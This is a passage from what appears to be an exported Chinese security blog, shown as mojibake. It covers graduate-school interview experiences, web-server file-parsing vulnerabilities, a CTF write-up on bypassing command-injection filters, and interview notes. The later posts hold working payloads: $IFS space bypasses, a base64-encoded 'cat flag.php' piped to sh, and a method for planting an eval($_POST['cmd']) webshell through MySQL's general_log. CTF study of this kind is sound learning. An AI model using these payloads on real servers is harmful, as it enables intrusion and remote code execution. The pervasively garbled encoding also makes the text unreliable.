¼å¼è¾“å…¥è¾“å‡ºï¼Œç®—å¹³å‡åˆ†ä¹‹ç±»çš„ï¼Œæœ€åä¸€ä¸ªæ˜¯ç±»ä¼¼çŸ©é˜µè½¬ç½®è¾“å‡ºã€‚ã€‚æ²¡å†™ä¸Šæ¥è‰ã€‚</p><p>é¢è¯•å¤§æ¦‚æ˜¯ä¸Šæ¥å…ˆæŠ½é¢˜ æˆ‘æŠ½åˆ°äº†ç®€è¿°è®¡ç®—æœºç½‘ç»œOSIä¸ƒå±‚æ¨¡å‹ï¼Œç„¶åå°±æ˜¯è€å¸ˆæé—®ï¼Œé—®æˆ‘æé™ç¼–ç¨‹çš„æ¦‚å¿µã€‚ã€‚ã€‚ä¸ä¼šï¼›é—®æˆ‘MIPSäº†è§£å¤šå°‘ã€‚ã€‚ã€‚ä¸ä¼šï¼›é—®æˆ‘ACID ï¼Œè¯´äº†AIDå¿˜äº†Cçš„å«ä¹‰æ˜¯å•¥äº†ã€‚ã€‚ã€‚å°´å°¬ï¼›æœ€åç­‰äº†ä¸€å‘¨ç»™äº†ä¸“ç¡•ã€‚</p><h2 id="å±±ä¸œå¤§å­¦-ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢"><a href="#å±±ä¸œå¤§å­¦-ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢" class="headerlink" title="å±±ä¸œå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢"></a>å±±ä¸œå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢</h2><p>SDUç½‘å®‰æ˜¯æˆ‘æ¯”è¾ƒæƒ³å»çš„ä¸€ä¸ªå­¦æ ¡ï¼Œæœ‰æƒ³è·Ÿçš„è€å¸ˆï¼Œå¯æƒœé‚£ä½è€å¸ˆä¸è¦æˆ‘ï¼Œå½“ç„¶ï¼Œè¿˜æœ‰ä¸€ä½æƒ³è·Ÿçš„è€å¸ˆï¼Œé‚£ä½è€å¸ˆäººå¾ˆå¥½ï¼Œæˆ‘ä¹Ÿæå‰å’Œä»–è”ç³»äº†ã€‚</p><p>å¤ä»¤è¥å±±å¤§ç½‘å®‰é¢è¯•120ä¸ªäººæ”¶17ä¸ªä¼˜è¥ï¼ŒåŒ…æ‹¬6ä¸ªå·¦å³çš„æœ¬æ ¡..</p><p>é¢è¯•å½“å¤©é—®æˆ‘å¯¹å¯†ç å­¦æœ‰å¤šå°‘äº†è§£ï¼Œæˆ‘è¯´äº†è§£è¿‡å¯¹ç§°ã€éå¯¹ç§°åŠ å¯†ï¼Œåœ¨èšå‰‘åŠ å¯†æµé‡åˆ†æä¸­ç”¨è¿‡ã€‚ç„¶åé—®æˆ‘äº†è§£è¿‡å“ªäº›ç³»ç»Ÿå®‰å…¨æ–¹é¢çš„æ¼æ´ï¼Œæˆ‘è¯´meltdownï¼Œæˆ‘è¯´æœ¬ç§‘ä¸»è¦æ˜¯åšwebæ–¹å‘ï¼Œè€å¸ˆè¯´å¸Œæœ›æˆ‘ä»¥åå¤šäº†è§£ç³»ç»Ÿå®‰å…¨çš„çŸ¥è¯†ã€‚ï¼ˆå…¶ä»–ç»†èŠ‚è®°ä¸å¤ªæ¸…äº† å¤ä»¤è¥å°è±¡ä¸æ˜¯å¤ªæ·±åˆ»ï¼‰</p><p>æœ€åä¼˜è¥å½“ç„¶æ²¡æˆ‘å•¥äº‹</p><h2 id="å›½é˜²ç§‘æŠ€å¤§å­¦-ç”µå­å¯¹æŠ—å­¦é™¢"><a href="#å›½é˜²ç§‘æŠ€å¤§å­¦-ç”µå­å¯¹æŠ—å­¦é™¢" class="headerlink" title="å›½é˜²ç§‘æŠ€å¤§å­¦ ç”µå­å¯¹æŠ—å­¦é™¢"></a>å›½é˜²ç§‘æŠ€å¤§å­¦ ç”µå­å¯¹æŠ—å­¦é™¢</h2><p>NUDTç”µæŠ—æˆ‘å…ˆè”ç³»äº†ä¸€ä½æ•™æˆï¼Œå¦‚æ²æ˜¥é£çš„æ„Ÿè§‰ï¼Œç»™äººä¸€ç§å’Œè”¼å¯äº²çš„æ„Ÿè§‰ï¼Œåœ¨å’Œåœ°æ–¹ç”Ÿå­¦é•¿äº¤æµçš„æ—¶å€™å¾—çŸ¥è¯¥è€å¸ˆæ°´å¹³å¾ˆé«˜ï¼Œè¦æ±‚ä¸¥æ ¼ï¼Œä¸ç¼ºå­¦ç”Ÿï¼Œæˆ‘ä¹Ÿå¾ˆè£å¹¸ä»–èƒ½ç›¸ä¸­æˆ‘ã€‚</p><p>åœ¨é¢è¯•çš„æ—¶å€™è®¾å¤‡é—®é¢˜ï¼Œä¸€ç›´å±å±å•¦å•¦å¯¹é¢å¬ä¸æ¸…ï¼Œè¿›è¡Œè‹±æ–‡è‡ªæˆ‘ä»‹ç»çš„æ—¶å€™è¢«è¿«å«åœã€‚åé¢ç®€å•é—®äº†é—®é¡¹ç›®ã€å®ä¹ å’Œç¾èµ›ç»å†ï¼Œé‡ç‚¹é—®äº†ç¾èµ›é‡Œé¢æˆ‘æ‰¿æ‹…çš„å·¥ä½œï¼Œå¹¶é—®äº†ä¸»è¦æ˜¯è°ç¿»è¯‘çš„ã€‚</p><p>æœ€åè€ƒæ ¸ç»“æœå¤ä»¤è¥å½•å–åé¢ç½‘å®‰ä¸º10ä¸ªï¼Œæˆ‘æ’ç¬¬äºŒï¼Œå…é¢„æ¨å…å¤è¯•ã€‚</p><h2 id="ä¸­å¤®è´¢ç»å¤§å­¦-ä¿¡æ¯å­¦é™¢"><a href="#ä¸­å¤®è´¢ç»å¤§å­¦-ä¿¡æ¯å­¦é™¢" class="headerlink" title="ä¸­å¤®è´¢ç»å¤§å­¦ ä¿¡æ¯å­¦é™¢"></a>ä¸­å¤®è´¢ç»å¤§å­¦ ä¿¡æ¯å­¦é™¢</h2><p>æ²¡å»é¢è¯•</p><h2 id="è¥¿åŒ—å·¥ä¸šå¤§å­¦-ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢"><a href="#è¥¿åŒ—å·¥ä¸šå¤§å­¦-ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢" class="headerlink" title="è¥¿åŒ—å·¥ä¸šå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢"></a>è¥¿åŒ—å·¥ä¸šå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢</h2><p>æ²¡å»é¢è¯•</p><h1 id="é¢„æ¨å…é¢ç»"><a href="#é¢„æ¨å…é¢ç»" class="headerlink" title="é¢„æ¨å…é¢ç»"></a>é¢„æ¨å…é¢ç»</h1><p>é¢„æ¨å…çš„baræ˜æ˜¾ä½äº†ä¸å°‘ã€‚</p><h2 id="ç”µå­ç§‘æŠ€å¤§å­¦-å¯¼å¸ˆé¢è¯•"><a href="#ç”µå­ç§‘æŠ€å¤§å­¦-å¯¼å¸ˆé¢è¯•" class="headerlink" title="ç”µå­ç§‘æŠ€å¤§å­¦ å¯¼å¸ˆé¢è¯•"></a>ç”µå­ç§‘æŠ€å¤§å­¦ å¯¼å¸ˆé¢è¯•</h2><p>ç”µå­ç§‘æŠ€å¤§å­¦åœ¨ä¸ƒæœˆä¸‹æ—¬æå‰è”ç³»å¯¼å¸ˆï¼Œå‚åŠ äº†å¯¼å¸ˆå›¢é˜Ÿé¢è¯•ã€‚ä¸€å…±å¤§æ¦‚ä¸‰å››ä½è€å¸ˆï¼Œé¦–å…ˆç”¨ä¸­æ–‡ç®€å•åœ°ä»‹ç»äº†è‡ªå·±ï¼Œé—®æˆ‘çš„é¡¹ç›®å†™äº†å¤šå°‘è¡Œä»£ç ï¼Œæ˜¯ä¸æ˜¯è‡ªå·±å†™çš„ï¼Œé—®æˆ‘çš„æ‰«æå™¨èƒ½å¦åœ¨æ‰«æé€Ÿåº¦å¾ˆå¿«çš„æƒ…å†µä¸‹æ‰«æå®Œæ‰€æœ‰ç›®æ ‡URLï¼Œé—®ZOOMEYE\FOFA\SHODANç­‰ç©ºé—´æµ‹ç»˜å¼•æ“çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼ˆä¸»è¦çœ‹ç€ç®€å†é—®ï¼‰ï¼Œé—®äº†é—®æˆ‘ç¾èµ›çš„è·å¥–æ¯”ä¾‹ä»¥åŠè´Ÿè´£çš„å·¥ä½œã€‚æœ€åé—®äº†æˆ‘æ ¡æ˜¯å¦985211ï¼Œæ•°å°æ—¶åè¢«é€šçŸ¥é€šè¿‡å›¢é˜Ÿé¢è¯•ï¼Œç»è¿‡å­¦é™¢é¢è¯•åå¯ç›´æ¥æŠ¥è€å¸ˆã€‚</p><h2 id="å¤©æ´¥å¤§å­¦-æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨"><a href="#å¤©æ´¥å¤§å­¦-æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨" class="headerlink" title="å¤©æ´¥å¤§å­¦ æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨"></a>å¤©æ´¥å¤§å­¦ æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨</h2><p>å¤©å¤§æˆ‘å…ˆè”ç³»äº†ä¸€ä½è€å¸ˆï¼Œè¿™ä½è€å¸ˆçš„ç ”ç©¶æ–¹å‘å’Œæˆ‘éå¸¸ç¬¦åˆï¼Œè€å¸ˆä¹Ÿå¾ˆæ˜ç¡®åœ°æƒ³è¦æˆ‘ï¼Œä½†æ˜¯å¤ä»¤è¥å¡985211ï¼Œæ‰€ä»¥æˆ‘æ²¡è¿›å»ï¼Œç­‰é¢„æ¨å…æ‰è¿›å»çš„ã€‚</p><p>é¢è¯•é¦–å…ˆæ˜¯ä¸€åˆ†é’Ÿçš„è‹±æ–‡è‡ªæˆ‘ä»‹ç»ï¼Œä»‹ç»è¿‡åè®²ä¸€ä¸‹è‡ªå·±å‡†å¤‡çš„PPTï¼ˆå¯ä»¥ä¸­æ–‡å†ä»‹ç»ä¸€ä¸‹ï¼‰ç„¶åè®²ä¸€ä¸ªä½ è®¤ä¸ºæœ€é‡è¦çš„é¡¹ç›®ï¼ˆæˆ‘å½“æ—¶å¬é”™äº†ï¼Œæˆ‘ä»¥ä¸ºæ˜¯ä¸é™ç§‘ç ”ç»å†ï¼Œåªé™ä¸€ä¸ªé¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä¸€å…±è®²äº†ä¸‰ä¸ªï¼Œé¢è¯•è€å¸ˆæœ‰äº›ä¸å¤ªé«˜å…´ï¼‰ï¼Œæœ€åé—®äº†é—®æˆ‘çš„è®ºæ–‡æ˜¯æ€ä¹ˆå†™çš„ï¼Œåˆ›æ–°ç‚¹åœ¨å“ªé‡Œã€‚ç»“æŸé¢è¯•</p><p>æœ€åç»™äº†ç½‘å®‰å­¦ç¡•ï¼Œéå¸¸éå¸¸æ„Ÿè°¢è®¸è€å¸ˆã€‚</p><h2 id="å±±ä¸œå¤§å­¦-ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢-1"><a href="#å±±ä¸œå¤§å­¦-ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢-1" class="headerlink" title="å±±ä¸œå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢"></a>å±±ä¸œå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢</h2><p>å’Œè€å¸ˆè”ç³»è¿‡åæˆ‘è§‰å¾—å»å±±å¤§ä¸“ç¡•è¿˜æ˜¯æ¯”è¾ƒæœ‰å¸Œæœ›çš„ï¼Œäºæ˜¯æŠ¥äº†å±±å¤§çš„é¢„æ¨å…ï¼Œæ¯”è¾ƒæ™šï¼Œé¢è¯•åœ¨8å·ã€‚</p><p>é¢è¯•é¦–å…ˆæ˜¯ä¸€è½®æ‹·é—®ï¼Œè¿˜æ˜¯é—®æˆ‘ç¾èµ›è´Ÿè´£çš„å·¥ä½œã€é—®æˆ‘æœ¬ç§‘åšä»€ä¹ˆæ–¹å‘ï¼Œè¯´æˆ‘æœ¬ç§‘æ‰“webï¼Œç ”ç©¶ç”Ÿæ–¹å‘ä¸å¤ªä¸€æ ·ã€‚ç„¶åæœ‰ä¸ªè€å¸ˆç”¨è‹±æ–‡è®©æˆ‘æè¿°ä¸€ä¸‹æˆ‘çš„æ•°æ®å¯è§†åŒ–é¡¹ç›®ï¼Œè¿˜æœ‰ä¸€ä½è€å¸ˆé—®äº†KASLRçš„ä½œç”¨ä»¥åŠåŸç†ã€‚ã€‚åŸç†æ²¡è¯´ä¸Šæ¥ï¼Œè¿˜æ˜¯è¿™ä½è€å¸ˆï¼Œé—®äº†æˆ‘çš„è®ºæ–‡åˆ›æ–°ç‚¹åœ¨å“ªé‡Œï¼Œæœ‰æ²¡æœ‰è‡ªå·±çš„æ–°ä¸œè¥¿â€¦.ä¸€é’ˆè§è¡€ã€‚ã€‚æœç„¶ä¸ä¸€èˆ¬ã€‚</p><p>æœ€åæƒ³ç€èƒ½æœ‰ä¸“ç¡•å°±è¡Œäº†ï¼Œç»“æœè€å¸ˆå¸®æˆ‘é€’è¡¥äº†å­¦ç¡•ï¼Œæ„Ÿè°¢sduï¼Œæ„Ÿè°¢éƒ­è€å¸ˆã€‚</p><h2 id="ç”µå­ç§‘æŠ€å¤§å­¦-è®¡ç®—æœºç§‘å­¦ä¸å·¥ç¨‹å­¦é™¢"><a href="#ç”µå­ç§‘æŠ€å¤§å­¦-è®¡ç®—æœºç§‘å­¦ä¸å·¥ç¨‹å­¦é™¢" class="headerlink" title="ç”µå­ç§‘æŠ€å¤§å­¦ è®¡ç®—æœºç§‘å­¦ä¸å·¥ç¨‹å­¦é™¢"></a>ç”µå­ç§‘æŠ€å¤§å­¦ è®¡ç®—æœºç§‘å­¦ä¸å·¥ç¨‹å­¦é™¢</h2><p>UESTCæ˜¯æˆ‘æœ€åä¸€æˆ˜ï¼Œéå¸¸ç´§å¼ ã€‚</p><p>é¢è¯•é¦–å…ˆæ˜¯ä¸‰åˆ†é’Ÿçš„PPTè‡ªæˆ‘ä»‹ç»ï¼Œä»‹ç»äº†å­¦æœ¯èƒŒæ™¯ã€ç§‘ç ”ç»å†ã€é¡¹ç›®ç»å†ã€‚</p><p>ç„¶åæ˜¯æŠ½é¢˜ ï¼ŒæŠ½åˆ°çš„é¢˜æ˜¯æè¿°ç®—æ³•ï¼Œå¦‚ä½•æ‰¾å‡ºä¸¤ä¸ªstirngçš„å…¬å…±å­—ç¬¦ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯è‹±æ–‡é—®é¢˜ï¼Œdescribe a project å’Œ why choose our school?</p><p>éƒ½æ¯”è¾ƒç®€å•ï¼Œè€è€ƒç‚¹äº†ã€‚</p><p>ä¸‹é¢å°±å¼€å§‹æ‹·é—®äº†ï¼Œä¸“ä¸šçŸ¥è¯†é—®äº†è½¯ä»¶æµ‹è¯•çš„å››ä¸ªè¿‡ç¨‹ï¼Œé»‘ç›’æµ‹è¯•å’Œç™½ç›’æµ‹è¯•çš„åŒºåˆ«ï¼Œå› ä¸ºæˆ‘æœ¬ç§‘æ˜¯è½¯ä»¶å·¥ç¨‹ï¼Œé—®æˆ‘å‡­ä»€ä¹ˆæŠ¥ä¿¡æ¯å®‰å…¨ï¼ˆï¼Ÿï¼‰æˆ‘è¯´æˆ‘è‡ªå·±æœ¬ç§‘ä¸»åŠ¨å­¦ä¹ ç›¸å…³çŸ¥è¯†ç­‰ã€‚</p><p>å®‰å…¨å¼€å‘çš„ç»å†ã€è¿™ä¸ªçŸ­æœŸå®ä¹ ä½ è§‰å¾—ä½ éƒ½æ”¶è·äº†ä»€ä¹ˆä¸œè¥¿ï¼Ÿ</p><p>ç¾èµ›ä¸»è¦è´Ÿè´£å“ªäº›å†…å®¹ï¼Ÿ</p><p>æ¥ä¸‹æ¥è€å¸ˆé—®æˆ‘æ›´åå‘çº¯æŠ€æœ¯è¿˜æ˜¯éƒ¨åˆ†æŠ€æœ¯+socialï¼Œæˆ‘é€‰æ‹©äº†å‰è€…ã€‚</p><p>æœ€åè€å¸ˆé—®æˆ‘ç›®å‰çš„ä¸»æ”»æ–¹å‘æ˜¯ä»€ä¹ˆï¼Œæˆ‘BBäº†ä¸€å †æ‰“å¤ªæï¼Œæœ€åè€å¸ˆåˆé—®ï¼Œæˆ‘ç ´é˜²äº†ï¼Œé‚è¯´Webå®‰å…¨/æ¸—é€æµ‹è¯•ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><strong>ä¿ç ”æ—¢æœ‰å®åŠ›ä¹Ÿæœ‰è¿æ°”ï¼Œç¥å¤§å®¶å¥½è¿ã€‚</strong></p><p>ä¸èƒ½ä¿è¯å¥½è¿çš„å‰æä¸‹è¯·å°½é‡æå‡è‡ªæˆ‘ï¼Œå› ä¸ºåœ¨é¢è¯•ä¸­ä¸ä¸€å®šä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œè¯·å®Œå–„ç®€å†ï¼ŒåŠ¡å¿…å¯¹ç®€å†ä¸Šçš„æ¯ä¸€ä¸ªé—®é¢˜éƒ½ç†Ÿæ‚‰ã€‚</p><p>å½“ä½ è§‰å¾—æ™šäº†çš„æ—¶å€™å¼€å§‹ï¼Œæ°æ°æ˜¯æœ€æ—©çš„æ—¶å€™ï¼Œ<strong>ç°åœ¨å¼€å§‹ï¼Œä¸€åˆ‡ä¸æ™š</strong>ã€‚</p><p>å­¦ä¼šç¤¾äº¤ï¼Œå­¦ä¼šé—®é—®é¢˜ï¼Œå­¦ä¼šå’Œè€å¸ˆæ²Ÿé€šäº¤æµï¼Œå†³å®šé¸½çš„æ—¶å€™è¦å°½é‡å°½æ—©ï¼Œå°±ç®—ä¸èƒ½æ—©é¸½ä¹Ÿä¸€å®šæå‰å’Œè€å¸ˆè¯´æ˜æƒ…å†µï¼Œå¤§å¤šæ•°è€å¸ˆä¼šç†è§£ã€‚ä¸€å®šå¤„ç†å¥½å’Œå­¦æ ¡çš„å…³ç³»ï¼Œè¿™ä¸ä»…å…³ä¹ä½ ï¼Œæ›´å…³ä¹ä½ çš„å­¦å¼Ÿå­¦å¦¹ã€‚</p><h2 id="è”ç³»æ–¹å¼"><a href="#è”ç³»æ–¹å¼" class="headerlink" title="è”ç³»æ–¹å¼"></a>è”ç³»æ–¹å¼</h2><p><strong>ä¸ªäººVX:ab444o æ¬¢è¿å¸ˆå¼Ÿå¸ˆå¦¹äº¤æµä¿ç ”ç›¸å…³é—®é¢˜~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è§£ææ¼æ´å°ç»“</title>
      <link href="2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
      <url>2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥:<br><a href="https://www.jianshu.com/p/a1fa305a6b8f">https://www.jianshu.com/p/a1fa305a6b8f</a></p><h1 id="IIS5-6è§£ææ¼æ´"><a href="#IIS5-6è§£ææ¼æ´" class="headerlink" title="IIS5/6è§£ææ¼æ´"></a>IIS5/6è§£ææ¼æ´</h1><p>ç›®å½•è§£æ:åœ¨ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹çš„åç§°ä¸­å¸¦æœ‰.aspã€.asaç­‰å¯æ‰§è¡Œè„šæœ¬æ–‡ä»¶åç¼€ä¸ºåç¼€çš„æ–‡ä»¶å¤¹ï¼Œå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½è¢«IISå½“ä½œå¯æ‰§è¡Œæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚<br>æ¯”å¦‚ <a href="http://www.baidu.com/1.asp/1.jpg">www.baidu.com/1.asp/1.jpg</a><br>æ–‡ä»¶è§£æ:åœ¨IIS6.0ä¸‹ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´6.0ä¸‹ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´xx.asp;.jpgå°†è¢«å½“åšxx.aspè§£æå¹¶æ‰§è¡Œã€‚<br><a href="http://www.xxx.com/xx.asp;.jpg">http://www.xxx.com/xx.asp;.jpg</a><br>IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶æœ‰aspã€asaã€cerã€cdxå››ç§ã€‚</p><h1 id="IIS-7-0-IIS-7-5-Nginx-lt-0-8-3ç•¸å½¢è§£ææ¼æ´"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-0-8-3ç•¸å½¢è§£ææ¼æ´" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3ç•¸å½¢è§£ææ¼æ´"></a>IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3ç•¸å½¢è§£ææ¼æ´</h1><p>åœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹,åœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„(/xx.jpg)åé¢åŠ ä¸Š/xx.PHPä¼šå°† /xx.jpg/xx.php è§£æä¸º php æ–‡ä»¶ã€‚<br>å¸¸ç”¨åˆ©ç”¨æ–¹æ³•ï¼š å°†ä¸€å¼ å›¾å’Œä¸€ä¸ªå†™å…¥åé—¨ä»£ç çš„æ–‡æœ¬æ–‡ä»¶åˆå¹¶ å°†æ¶æ„æ–‡æœ¬å†™å…¥å›¾ç‰‡çš„äºŒè¿›åˆ¶ä»£ç ä¹‹åï¼Œé¿å…ç ´åå›¾ç‰‡æ–‡ä»¶å¤´å’Œå°¾</p><h1 id="Nginx-lt-0-8-37-è§£ææ¼æ´"><a href="#Nginx-lt-0-8-37-è§£ææ¼æ´" class="headerlink" title="Nginx &lt;=0.8.37 è§£ææ¼æ´"></a>Nginx &lt;=0.8.37 è§£ææ¼æ´</h1><p>00æˆªæ–­<br>åœ¨Fast-CGIå…³é—­çš„æƒ…å†µä¸‹ï¼ŒNginx &lt;=0.8.37 ä¾ç„¶å­˜åœ¨è§£ææ¼æ´<br>åœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„(/xx.jpg)åé¢åŠ ä¸Š%00.phpä¼šå°† /xx.jpg%00.php è§£æä¸º php æ–‡ä»¶ã€‚</p><h1 id="Apache-è§£ææ¼æ´"><a href="#Apache-è§£ææ¼æ´" class="headerlink" title="Apache è§£ææ¼æ´"></a>Apache è§£ææ¼æ´</h1><p>åç¼€è§£æï¼štest.php.x1.x2.x3<br>Apacheå°†ä»å³è‡³å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œè‹¥x3éå¯è¯†åˆ«åç¼€ï¼Œå†åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå°†è¯¥å¯è¯†åˆ«åç¼€è¿›è§£æ<br>test.php.x1.x2.x3 åˆ™ä¼šè¢«è§£æä¸ºphp</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œç»•è¿‡(ping ping ping)</title>
      <link href="2020/06/20/ping-ping-ping/"/>
      <url>2020/06/20/ping-ping-ping/</url>
      
        <content type="html"><![CDATA[<p>é¡µé¢ç»™äº†ä¸ªipï¼Œè€ƒè™‘pingå‘½ä»¤çš„å‘½ä»¤æ‰§è¡Œã€‚<br>è¿™é‡Œè¿‡æ»¤çš„å†…å®¹æ¯”è¾ƒå¤šï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œè€Œä¸”æœ‰äº›ç©ºæ ¼ç»•è¿‡æ–¹æ³•ä¹Ÿç”¨ä¸äº†ã€‚<br>è¿™é‡Œç»•è¿‡ç©ºæ ¼ç”¨çš„æ˜¯$IFS$9<br>æ¥ä¸‹æ¥å°è¯•cat flag<br>flagå­—æ®µä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°è¯•ä½¿ç”¨é€šé…ç¬¦ä¹Ÿä¸è¡Œï¼Œ*ä¹Ÿä¸è¡Œï¼Œ[]ç¬¦å·ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚<br>æ¥ä¸‹æ¥å°è¯•base64ç¼–ç ã€‚<br>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh å¯è¡Œ<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯cat <code>åå¼•å·é‡Œé¢çš„å†…å®¹---</code> æˆ–$() ä¼šå¼•ç”¨å‘½ä»¤è¢«æ‰§è¡Œåçš„ç»“æœã€‚<br>?ip=127.0.0.1;cat$IFS$9<code>ls</code><br>è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯æ‹¼æ¥ï¼š<br>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php<br>è¿™æ ·ä¹Ÿå¯ä»¥ç»•è¿‡ã€‚<br>è¡¥å……ç©ºæ ¼ç»•è¿‡ï¼š{cat,1.txt}<br>å…³é”®å­—è¿‡æ»¤ç»•è¿‡ï¼šåæ–œæ  ca\tã€å˜é‡ä»£æ¢ã€ç¼–ç ã€ echo xxxx | base64 -d|sh/bashã€å¼•å·câ€™aâ€™t<br>å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤<br>1.&amp;<br>&amp; è¡¨ç¤ºå°†ä»»åŠ¡ç½®äºåå°æ‰§è¡Œ<br>2.&amp;&amp;<br>åªæœ‰åœ¨ &amp;&amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ&amp;&amp; å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚<br>3.|<br>| è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°<br>4.||<br>åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œ|| å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚<br>5.ï¼›<br>å¤šè¡Œè¯­å¥ç”¨æ¢è¡ŒåŒºåˆ†ä»£ç å¿«ï¼Œå•è¡Œè¯­å¥ä¸€èˆ¬è¦ç”¨åˆ°åˆ†å·æ¥åŒºåˆ†ä»£ç å—</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¢è¯•é—®é¢˜æ•´ç†</title>
      <link href="2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"/>
      <url>2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸é—´æ–­åœ°è®°å½•é¢è¯•é‡åˆ°çš„é—®é¢˜ï¼Œå¸Œæœ›èƒ½å¯¹è‡ªå·±æœ‰ä¸ªè­¦é†’ï¼Œå¯¹åè¾ˆæœ‰æ‰€ä½œç”¨ã€‚</p><h1 id="MySQLå†™Webshellçš„æ¡ä»¶"><a href="#MySQLå†™Webshellçš„æ¡ä»¶" class="headerlink" title="MySQLå†™Webshellçš„æ¡ä»¶"></a>MySQLå†™Webshellçš„æ¡ä»¶</h1><p>1.çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„<br>2.æœ‰å¯¹ç½‘ç«™ç»å¯¹è·¯å¾„çš„å†™æƒé™ select @@basedir;<br>3.æ²¡æœ‰é…ç½®secure_file_priv æˆ–è€…å…¶ä¸ºç©º<br>4.GPCå…³é—­ï¼ˆé»˜è®¤å…³é—­ï¼‰<br>secure_file_privå·²ç»è®¾ç½®çš„è¯ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—æ–‡ä»¶åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œç„¶åé€šè¿‡åŒ…å«çš„æ–¹å¼å†™shell<br>æµç¨‹ï¼š<br>é¦–å…ˆæ‰¾åˆ°æ—¥å¿—å­˜æ”¾ä½ç½®ï¼š<br>æ¥ä¸‹æ¥è®¾ç½®general_log ä¸ºonï¼šset global general_log = on;<br>æ¥ä¸‹æ¥æŠŠæ—¥å¿—æ–‡ä»¶ä¿®æ”¹ä¸ºç½‘ç«™ç»å¯¹ç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶ æ¯”å¦‚set global general_log_file =â€™/var/www/html/shell.phpâ€™;<br>æ¥ä¸‹æ¥select <?php eval($_POST['cmd']); ?> å³å¯è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåœ¨URLä¸­è®¿é—®æ—¥å¿—æ–‡ä»¶å³å¯ã€‚<br>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç›®æ 